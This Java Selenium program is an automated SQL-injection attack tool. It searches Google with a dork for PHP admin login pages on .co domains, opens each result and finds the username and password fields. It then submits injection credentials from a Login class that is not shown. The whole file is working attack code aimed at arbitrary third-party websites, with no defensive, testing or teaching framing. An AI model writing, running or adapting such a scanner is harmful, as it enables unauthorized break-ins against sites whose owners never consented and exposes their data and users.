package com.mert;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

import java.util.List;

public class SqlInjection {
    private WebElement usernameInput;
    private WebElement passwordInput;
    private WebElement button;
    private WebDriver driver;

    public SqlInjection() {
        driver = new ChromeDriver();
        driver.manage().window().maximize();
    }

    public void getGoogleBot() throws InterruptedException {
        String baseUrl = "https://www.google.com";
        String dork = "inurl:login filetype:php intext:admin  site:.co"; // br

        driver.get(baseUrl);
        WebElement searchInput = driver.findElement(By.name("q"));

        searchInput.sendKeys(dork);
        searchInput.submit();
        Thread.sleep(2000);
        List<WebElement> pages = pages = driver.findElements(By.tagName("h3"));

        for (int i = 0; i < pages.size(); i++) {
            pages = driver.findElements(By.tagName("h3"));
            pages.get(i).click();
            FindInputsOnPage();

            if (checkEmptyInputs()) {
                startInjection();
                Thread.sleep(3000);
            } else {
                Thread.sleep(2000);
            }
            driver.navigate().back();

            if(driver.findElements(By.tagName("h3")).size() < 9)
                driver.navigate().back();

            clearInputs();
        }
    }

    public void FindInputsOnPage() {
        List<WebElement> inputs = driver.findElements(By.tagName("input"));

        if (inputs == null)
            return;

        for (WebElement item : inputs) {
            if ((item.getAttribute("name").equals("username") ||
                    item.getAttribute("name").equals("email") ||
                    item.getAttribute("name").equals("id")) &&
                    usernameInput == null)
                usernameInput = item;
            if (item.getAttribute("type").equals("password") ||
                    item.getAttribute("type").equals("pass") ||
                    item.getAttribute("type").equals("adminpassword"))
                passwordInput = item;

        }
    }

    public void clearInputs() {
        this.button = null;
        this.passwordInput = null;
        this.usernameInput = null;
    }

    public void startInjection() throws InterruptedException {
        List<Login> list = Login.getSqlInjectionCredentials();

        usernameInput.sendKeys(list.get(0).getUsername());
        passwordInput.sendKeys(list.get(0).getPaswd());
        passwordInput.submit();
    }

    public Boolean checkEmptyInputs() {
        if (usernameInput != null && passwordInput != null)
            return true;
        else
            return false;
    }

}
